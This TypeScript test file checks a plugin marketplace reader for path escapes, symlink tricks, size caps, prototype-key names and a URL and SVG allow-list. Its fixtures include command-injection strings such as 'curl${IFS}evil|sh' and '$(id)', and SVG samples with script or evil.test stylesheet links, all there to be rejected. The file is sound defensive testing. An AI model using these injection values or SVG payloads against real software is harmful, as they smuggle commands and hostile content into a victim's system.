// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Grimoire Authors

// The reader's trust boundary: the export tree is local, but it is built from
// foreign plugin repositories, so every path in it is checked before it is read
// and every size before it is kept. Trees are written into tmp dirs here.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import {
  loadMarketplace,
  MAX_DOC_BYTES,
  MAX_LOGO_BYTES,
  MAX_MARKETPLACE_BYTES,
  parseMarketplace,
  readMarketplace,
  validLogo,
} from "../../src/marketplace/read.js";

let root: string;
let outside: string;

beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), "mk-read-"));
  outside = fs.mkdtempSync(path.join(os.tmpdir(), "mk-outside-"));
  // C-005: a marketplace exists iff the manifest does.
  write("marketplace.toml", '[marketplace]\nname = "acme"\n');
});
afterEach(() => {
  fs.rmSync(root, { recursive: true, force: true });
  fs.rmSync(outside, { recursive: true, force: true });
});

const EXPORT = "enrich/marketplace/export";
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from("rest")]);

function write(rel: string, content: string | Buffer): void {
  const file = path.join(root, rel);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, content);
}
function listing(plugins: unknown[], file = ".claude-plugin/marketplace.json"): void {
  write(`${EXPORT}/${file}`, JSON.stringify({ name: "acme", plugins }));
}
const entry = (name: string, source = `./c/${name}`) => ({ name, description: `${name} plugin`, source });
const names = (mk: ReturnType<typeof readMarketplace>) => mk?.plugins.map((p) => p.name);

describe("readMarketplace containment", () => {
  it("skips a plugin whose source climbs out, is absolute, or is not ./-relative, with a warning", () => {
    listing([entry("up", "./../../x"), entry("abs", "/etc"), entry("bare", "c/bare"), entry("ok")]);
    const warnings: string[] = [];
    const mk = loadMarketplace(root, [], (m) => warnings.push(m))?.marketplace;
    expect(names(mk ?? null)).toEqual(["ok"]);
    expect(warnings.map((w) => w.split(":")[0])).toEqual([
      "marketplace plugin up",
      "marketplace plugin abs",
      "marketplace plugin bare",
    ]);
  });

  it("skips a plugin whose directory is a symlink out of the export dir", () => {
    listing([entry("link"), entry("ok")]);
    fs.writeFileSync(path.join(outside, "README.md"), "# secret");
    fs.mkdirSync(path.join(root, EXPORT, "c"), { recursive: true });
    fs.symlinkSync(outside, path.join(root, EXPORT, "c/link"));
    write(`${EXPORT}/c/ok/README.md`, "# ok");
    expect(names(readMarketplace(root))).toEqual(["ok"]);
  });

  it("skips a plugin whose README is a symlink out of the export dir", () => {
    listing([entry("evil"), entry("ok")]);
    fs.writeFileSync(path.join(outside, "secret"), "x");
    fs.mkdirSync(path.join(root, EXPORT, "c/evil"), { recursive: true });
    fs.symlinkSync(path.join(outside, "secret"), path.join(root, EXPORT, "c/evil/README.md"));
    expect(names(readMarketplace(root))).toEqual(["ok"]);
  });

  it("keeps a plugin whose directory does not exist, with nothing to show", () => {
    listing([entry("ghost")]);
    const mk = readMarketplace(root);
    expect(mk?.docs.ghost).toEqual({ readme: false, changelog: false });
    expect(mk?.logos).toEqual({});
  });
});

describe("readMarketplace caps", () => {
  it("ignores a README or CHANGELOG over the cap but keeps the plugin and the other doc", () => {
    listing([entry("big")]);
    write(`${EXPORT}/c/big/README.md`, Buffer.alloc(MAX_DOC_BYTES + 1, "a"));
    write(`${EXPORT}/c/big/CHANGELOG.md`, Buffer.alloc(MAX_DOC_BYTES, "a"));
    expect(readMarketplace(root)?.docs.big).toEqual({ readme: false, changelog: true });
  });

  it("ignores a logo over the cap or with the wrong bytes, and takes the next extension", () => {
    listing([entry("a"), entry("b")]);
    write(`${EXPORT}/c/a/assets/logo.png`, Buffer.concat([PNG, Buffer.alloc(MAX_LOGO_BYTES)]));
    write(`${EXPORT}/c/b/assets/logo.png`, "<html/>");
    write(`${EXPORT}/c/b/assets/logo.svg`, '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>');
    expect(readMarketplace(root)?.logos).toEqual({ b: "c/b/assets/logo.svg" });
  });

  it("is null for a marketplace.json over the cap, or one that names nothing", () => {
    write(`${EXPORT}/.claude-plugin/marketplace.json`, " ".repeat(MAX_MARKETPLACE_BYTES + 1));
    expect(readMarketplace(root)).toBeNull();
    write(`${EXPORT}/.claude-plugin/marketplace.json`, JSON.stringify({ plugins: [entry("x")] }));
    expect(readMarketplace(root)).toBeNull();
  });
});

describe("readMarketplace listing and meta", () => {
  it("prefers the Claude file over the Qoder one", () => {
    listing([entry("claude-one")]);
    listing([entry("qoder-one")], ".qoder-plugin/marketplace.json");
    expect(names(readMarketplace(root))).toEqual(["claude-one"]);
  });

  it("reads the Qoder file when there is no Claude one", () => {
    listing([entry("q")], ".qoder-plugin/marketplace.json");
    const mk = readMarketplace(root);
    expect(names(mk)).toEqual(["q"]);
    expect(mk?.clients).toEqual(["qoder"]);
  });

  it("takes clients from meta.json over the files on disk, ignoring unknown ones", () => {
    listing([entry("a")]);
    write("enrich/marketplace/meta.json", JSON.stringify({ clients: ["codex", "bogus", "cursor"], members: {} }));
    expect(readMarketplace(root)?.clients).toEqual(["codex", "cursor"]);
  });

  it("falls back to every client file on disk when meta names none", () => {
    listing([entry("a")]);
    write(`${EXPORT}/.agents/plugins/marketplace.json`, "{}");
    expect(readMarketplace(root)?.clients).toEqual(["claude", "codex"]);
  });

  it("keeps the repository exactly as written, as grim's README prints it", () => {
    listing([entry("a")]);
    for (const url of ["https://GitLab.example/acme/m/", "https://gitlab.example//acme//m//", "https://gitlab.example"]) {
      write("enrich/marketplace/meta.json", JSON.stringify({ repository: url, members: {} }));
      expect(readMarketplace(root)?.repository).toBe(url);
    }
  });

  it("takes repository only when meta gives an https URL", () => {
    listing([entry("a")]);
    write("enrich/marketplace/meta.json", JSON.stringify({ repository: "https://git.acme.test/plugins.git", members: {} }));
    expect(readMarketplace(root)?.repository).toBe("https://git.acme.test/plugins.git");
    write("enrich/marketplace/meta.json", JSON.stringify({ repository: "http://git.acme.test/p", members: {} }));
    expect(readMarketplace(root)?.repository).toBeNull();
  });

  it("copes with a missing or malformed meta.json", () => {
    listing([entry("a")]);
    expect(readMarketplace(root)?.plugins[0]?.members).toEqual([]);
    write("enrich/marketplace/meta.json", "{not json");
    expect(readMarketplace(root)?.plugins[0]?.members).toEqual([]);
  });

  it("links a member only when its ref equals an indexed package's ref", () => {
    listing([entry("dev")]);
    write(
      "enrich/marketplace/meta.json",
      JSON.stringify({
        members: {
          dev: [
            { kind: "skill", name: "hex", ref: "ghcr.io/acme/lore/hex" },
            { kind: "skill", name: "other", ref: "ghcr.io/acme/lore/hex-other" },
            { kind: "rule\u0007", name: "style", ref: "ghcr.io/x/style" },
            { kind: "skill" },
          ],
          nobody: [{ kind: "skill", name: "z", ref: "r" }],
        },
      }),
    );
    const mk = readMarketplace(root, [{ ref: "ghcr.io/acme/lore/hex", namespace: "ghcr.io/acme", name: "lore/hex" }]);
    expect(mk?.plugins[0]?.members).toEqual([
      { kind: "skill", name: "hex", ref: "ghcr.io/acme/lore/hex", href: "/p/ghcr.io/acme/lore/hex/" },
      { kind: "skill", name: "other", ref: "ghcr.io/acme/lore/hex-other" },
      { kind: "rule", name: "style", ref: "ghcr.io/x/style" },
    ]);
  });
});

describe("loadMarketplace files", () => {
  it("returns the real paths of what may be staged, and logos relative to the export dir", () => {
    listing([entry("dev")]);
    write(`${EXPORT}/c/dev/README.md`, "# dev");
    write(`${EXPORT}/c/dev/assets/logo.png`, PNG);
    const loaded = loadMarketplace(root);
    const files = loaded?.files.get("dev");
    expect(files?.readme).toBe(fs.realpathSync(path.join(root, EXPORT, "c/dev/README.md")));
    expect(files?.changelog).toBeUndefined();
    expect(files?.logo?.ext).toBe("png");
    expect(loaded?.marketplace.logos.dev).toBe("c/dev/assets/logo.png");
  });
});

const warned = (fn: (warn: (m: string) => void) => unknown): string[] => {
  const out: string[] = [];
  fn((m) => out.push(m));
  return out;
};

describe("C-005 a marketplace exists iff marketplace.toml does", () => {
  it("is null, whatever export is left behind, when marketplace.toml is absent", () => {
    listing([entry("a")]);
    fs.rmSync(path.join(root, "marketplace.toml"));
    expect(readMarketplace(root)).toBeNull();
  });
});

describe("untrusted text that reaches a copy-paste command", () => {
  const HOSTILE_URLS = [
    "https://x.test/repo;curl${IFS}evil|sh",
    "https://x.test/repo`id`",
    "https://x.test/repo$(id)",
    "https://x.test/repo&&id",
    "https://x.test/repo'x",
    "https://x.test/repo?q=1",
    "https://x.test/repo#frag",
    "https://u:p@x.test/repo",
    "https:///u:t@x.test/repo",
    "https://",
    "https:// x.test/repo",
    "http://x.test/repo",
    "git@x.test:acme/plugins.git",
    `https://x.test/${"a".repeat(2100)}`,
  ];
  it.each(HOSTILE_URLS)("drops the repository %s", (repository) => {
    listing([entry("a")]);
    write("enrich/marketplace/meta.json", JSON.stringify({ repository, members: {} }));
    expect(readMarketplace(root)?.repository).toBeNull();
  });

  it("keeps a GitLab-style path and a github.com URL, and a long-but-valid one up to the cap", () => {
    listing([entry("a")]);
    for (const repository of ["https://gitlab.example.test/grp/sub/repo.git", "https://github.com/acme/plugins", `https://x.test/${"a".repeat(1500)}`]) {
      write("enrich/marketplace/meta.json", JSON.stringify({ repository, members: {} }));
      expect(readMarketplace(root)?.repository).toBe(repository);
    }
  });

  it.each(["x; curl evil|sh", "X", "-x", "x-", "a b", "x$(id)", "a".repeat(65), "x\ny"])("refuses the marketplace named %j, with a warning", (name) => {
    write(`${EXPORT}/.claude-plugin/marketplace.json`, JSON.stringify({ name, plugins: [entry("a")] }));
    const w = warned((warn) => expect(loadMarketplace(root, [], warn)).toBeNull());
    expect(w.join("\n")).toMatch(/marketplace name/);
  });
});

describe("plugin names", () => {
  it.each(["constructor", "toString", "valueOf", "hasOwnProperty", "__proto__"])(
    "reads a plugin named %s end to end without touching Object.prototype",
    (name) => {
      write(`${EXPORT}/.claude-plugin/marketplace.json`, `{"name":"acme","plugins":[{"name":${JSON.stringify(name)},"description":"d","source":"./c/p"}]}`);
      write(`${EXPORT}/c/p/README.md`, "# p");
      write(`${EXPORT}/c/p/assets/logo.png`, PNG);
      write("enrich/marketplace/meta.json", `{"members":{${JSON.stringify(name)}:[{"kind":"skill","name":"s","ref":"r/s"}]}}`);
      const loaded = loadMarketplace(root, [], () => {});
      const mk = loaded?.marketplace;
      if (name === "__proto__") {
        // The name grammar refuses it: nothing may be keyed by it.
        expect(names(mk ?? null)).toEqual([]);
        return;
      }
      expect(names(mk ?? null)).toEqual([name]);
      expect(Object.hasOwn(mk!.docs, name)).toBe(true);
      expect(Object.hasOwn(mk!.logos, name)).toBe(true);
      expect(mk!.plugins[0]!.members).toEqual([{ kind: "skill", name: "s", ref: "r/s" }]);
      expect(Object.getPrototypeOf(mk!.docs)).toBeNull();
      expect(Object.getPrototypeOf(mk!.logos)).toBeNull();
      // Serialised as plain JSON it stays an own key, and Object.prototype is untouched.
      const round = JSON.parse(JSON.stringify(mk)) as { docs: Record<string, unknown> };
      expect(Object.hasOwn(round.docs, name)).toBe(true);
      expect(({} as Record<string, unknown>).readme).toBeUndefined();
    },
  );

  it("does not give a plugin the docs or members of an inherited key", () => {
    listing([entry("a")]);
    write("enrich/marketplace/meta.json", '{"members":{"__proto__":[{"kind":"skill","name":"s","ref":"r"}],"constructor":[{"kind":"skill","name":"c","ref":"r"}]}}');
    const mk = readMarketplace(root);
    expect(mk?.plugins[0]?.members).toEqual([]);
    expect(Object.getPrototypeOf(mk)).toBe(Object.prototype);
    expect(({} as { kind?: unknown }).kind).toBeUndefined();
  });

  it.each(["all.json", "ALL.JSON", "index.html", "logos", "Logos", "con", "NUL", "com1", "lpt9", "aux.txt", "dot."])(
    "refuses the name %s, which collides with a route or a Windows device, with a warning",
    (name) => {
      listing([entry(name), entry("ok")]);
      const w = warned((warn) => expect(names(loadMarketplace(root, [], warn)?.marketplace ?? null)).toEqual(["ok"]));
      expect(w.join("\n")).toContain(name);
    },
  );

  it("drops a case-insensitive duplicate with a warning", () => {
    listing([entry("Foo"), entry("foo"), entry("ok")]);
    const w = warned((warn) => expect(names(loadMarketplace(root, [], warn)?.marketplace ?? null)).toEqual(["Foo", "ok"]));
    expect(w.join("\n")).toMatch(/foo/i);
  });
});

describe("symlinks on the way to the export", () => {
  it("reads nothing from an export directory that is a symlink out of the repo", () => {
    fs.mkdirSync(path.join(outside, ".claude-plugin"), { recursive: true });
    fs.writeFileSync(path.join(outside, ".claude-plugin/marketplace.json"), JSON.stringify({ name: "acme", plugins: [entry("evil")] }));
    fs.mkdirSync(path.join(root, "enrich/marketplace"), { recursive: true });
    fs.symlinkSync(outside, path.join(root, EXPORT));
    const w = warned((warn) => expect(loadMarketplace(root, [], warn)).toBeNull());
    expect(w.join("\n")).toMatch(/export/);
  });

  it("reads nothing when enrich/ itself is a symlink out of the repo", () => {
    fs.mkdirSync(path.join(outside, "marketplace/export/.claude-plugin"), { recursive: true });
    fs.writeFileSync(path.join(outside, "marketplace/export/.claude-plugin/marketplace.json"), JSON.stringify({ name: "acme", plugins: [entry("evil")] }));
    fs.symlinkSync(outside, path.join(root, "enrich"));
    expect(readMarketplace(root)).toBeNull();
  });

  it("ignores a listing file that is a symlink out of the export dir, with a warning", () => {
    fs.writeFileSync(path.join(outside, "m.json"), JSON.stringify({ name: "acme", plugins: [entry("evil")] }));
    fs.mkdirSync(path.join(root, EXPORT, ".claude-plugin"), { recursive: true });
    fs.symlinkSync(path.join(outside, "m.json"), path.join(root, EXPORT, ".claude-plugin/marketplace.json"));
    const w = warned((warn) => expect(loadMarketplace(root, [], warn)).toBeNull());
    expect(w.length).toBeGreaterThan(0);
  });

  it("ignores a listing directory that is a symlink out of the export dir", () => {
    fs.mkdirSync(path.join(outside, "d"), { recursive: true });
    fs.writeFileSync(path.join(outside, "d/marketplace.json"), JSON.stringify({ name: "acme", plugins: [entry("evil")] }));
    fs.mkdirSync(path.join(root, EXPORT), { recursive: true });
    fs.symlinkSync(path.join(outside, "d"), path.join(root, EXPORT, ".claude-plugin"));
    expect(readMarketplace(root)).toBeNull();
  });

  it("ignores a meta.json that is a symlink, with a warning", () => {
    listing([entry("a")]);
    fs.writeFileSync(path.join(outside, "meta.json"), JSON.stringify({ repository: "https://evil.test/r", members: {} }));
    fs.symlinkSync(path.join(outside, "meta.json"), path.join(root, "enrich/marketplace/meta.json"));
    const w = warned((warn) => expect(loadMarketplace(root, [], warn)?.marketplace.repository).toBeNull());
    expect(w.join("\n")).toMatch(/meta\.json/);
  });

  it("skips a plugin whose README is a symlink to a repo file outside the export dir", () => {
    listing([entry("a")]);
    fs.mkdirSync(path.join(root, EXPORT, "c/a"), { recursive: true });
    fs.symlinkSync(path.join(root, "marketplace.toml"), path.join(root, EXPORT, "c/a/README.md"));
    expect(names(readMarketplace(root))).toEqual([]);
  });
});

describe("listing files", () => {
  it.each([
    ["copilot", ".github/plugin/marketplace.json"],
    ["codex", ".agents/plugins/marketplace.json"],
    ["cursor", ".cursor-plugin/marketplace.json"],
  ])("falls back to the %s listing when it is the only one", (_client, file) => {
    listing([entry("only")], file);
    expect(names(readMarketplace(root))).toEqual(["only"]);
  });

  it("warns, and is null, when marketplace.toml is committed but nothing was exported", () => {
    const w = warned((warn) => expect(loadMarketplace(root, [], warn)).toBeNull());
    expect(w.join("\n")).toMatch(/export/);
  });

  it("warns for a listing that is oversized, not JSON, or has no plugin list", () => {
    write(`${EXPORT}/.claude-plugin/marketplace.json`, " ".repeat(MAX_MARKETPLACE_BYTES + 1));
    expect(warned((warn) => loadMarketplace(root, [], warn)).join("\n")).toMatch(/marketplace\.json.*(cap|large)/i);
    write(`${EXPORT}/.claude-plugin/marketplace.json`, "{nope");
    expect(warned((warn) => loadMarketplace(root, [], warn)).join("\n")).toMatch(/marketplace\.json.*JSON/i);
    write(`${EXPORT}/.claude-plugin/marketplace.json`, JSON.stringify({ name: "acme" }));
    expect(warned((warn) => loadMarketplace(root, [], warn)).join("\n")).toMatch(/marketplace\.json/);
  });

  it("warns when plugins beyond the cap are dropped", () => {
    listing(Array.from({ length: 105 }, (_, i) => entry(`p${i}`)));
    const w = warned((warn) => expect(loadMarketplace(root, [], warn)?.marketplace.plugins).toHaveLength(100));
    expect(w.join("\n")).toMatch(/105/);
  });

  it("says why a source without ./ is skipped, apart from one that leaves the export directory", () => {
    listing([entry("bare", "c/bare"), entry("up")]);
    fs.mkdirSync(path.join(root, EXPORT, "c"), { recursive: true });
    fs.symlinkSync(outside, path.join(root, EXPORT, "c/up"));
    const w = warned((warn) => loadMarketplace(root, [], warn));
    expect(w.find((m) => m.includes("bare"))).toMatch(/\.\//);
    expect(w.find((m) => m.includes("up"))).toMatch(/leave/);
  });

  it("warns for a meta.json that is oversized or not JSON, and for a dropped repository", () => {
    listing([entry("a")]);
    write("enrich/marketplace/meta.json", "{nope");
    expect(warned((warn) => loadMarketplace(root, [], warn)).join("\n")).toMatch(/meta\.json/);
    write("enrich/marketplace/meta.json", JSON.stringify({ repository: "https://x.test/r;id", members: {} }));
    expect(warned((warn) => loadMarketplace(root, [], warn)).join("\n")).toMatch(/repository/);
  });
});

describe("caps match grim's own limits", () => {
  it("keeps a README, CHANGELOG and logo up to 1 MiB", () => {
    listing([entry("a")]);
    write(`${EXPORT}/c/a/README.md`, Buffer.alloc(1024 * 1024, "a"));
    write(`${EXPORT}/c/a/CHANGELOG.md`, Buffer.alloc(1024 * 1024, "a"));
    write(`${EXPORT}/c/a/assets/logo.png`, Buffer.concat([PNG, Buffer.alloc(1024 * 1024 - PNG.length)]));
    expect(readMarketplace(root)?.docs.a).toEqual({ readme: true, changelog: true });
    expect(Object.keys(readMarketplace(root)?.logos ?? {})).toEqual(["a"]);
  });

  it("warns when a doc over the cap is dropped", () => {
    listing([entry("a")]);
    write(`${EXPORT}/c/a/README.md`, Buffer.alloc(MAX_DOC_BYTES + 1, "a"));
    expect(warned((warn) => loadMarketplace(root, [], warn)).join("\n")).toMatch(/README\.md/);
  });
});

describe("validLogo svg allow-list", () => {
  const svg = (inner: string, head = "") => Buffer.from(`${head}<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">${inner}</svg>`);

  it("accepts a plain svg, an xml declaration, a fragment <use>, and a gradient", () => {
    expect(validLogo("svg", svg('<rect width="1" height="1"/>'))).toBe(true);
    expect(validLogo("svg", svg("<rect/>", '<?xml version="1.0" encoding="UTF-8"?>\n'))).toBe(true);
    expect(validLogo("svg", svg('<defs><linearGradient id="g"/></defs><use href="#g"/><use xlink:href="#g"/>'))).toBe(true);
  });

  it.each([
    ["an xml-stylesheet instruction", svg("<rect/>", '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="x.xsl"?>')],
    ["a leading xml-stylesheet instruction in place of the declaration", svg("<rect/>", '<?xml-stylesheet type="text/xsl" href="https://evil.test/x.xsl"?>')],
    ["a script under a dotted namespace prefix", svg('<a.b:script xmlns:a.b="http://www.w3.org/2000/svg">alert(1)</a.b:script>')],
    ["a script under a non-ASCII namespace prefix", svg('<é:script xmlns:é="http://www.w3.org/2000/svg">alert(1)</é:script>')],
    ["any other processing instruction", svg('<?php echo 1 ?><rect/>')],
    ["a second xml declaration", svg('<?xml version="1.0"?><rect/>', '<?xml version="1.0"?>')],
    ["a <style> element", svg("<style>@import url(https://evil.test/x.css);</style>")],
    ["a prefixed <style> element", svg('<s:style xmlns:s="http://www.w3.org/2000/svg">a{}</s:style>')],
    ["a <link> element", svg('<link rel="stylesheet" href="https://evil.test/x.css"/>')],
    ["an external href", svg('<image href="https://evil.test/x.png"/>')],
    ["a data: href", svg('<image xlink:href="data:image/svg+xml;base64,AAAA"/>')],
    ["a relative href", svg('<use href="other.svg#a"/>')],
    ["an href animated in", svg('<a><animate attributeName="href" to="x"/></a>')],
    ["an external url() in a style attribute", svg('<rect style="fill:url(https://evil.test/x)"/>')],
    ["a DOCTYPE with an internal subset", svg("<rect/>", '<!DOCTYPE svg [<!ENTITY x "y">]>')],
  ])("refuses %s", (_what, bytes) => {
    expect(validLogo("svg", bytes)).toBe(false);
  });
});

describe("parseMarketplace warnings", () => {
  it("reports every dropped entry through the optional warn", () => {
    const w = warned((warn) => parseMarketplace({ plugins: [entry("ok"), entry("ok"), entry("all.json"), { name: 3 }] }, warn));
    expect(w.length).toBe(3);
  });
});
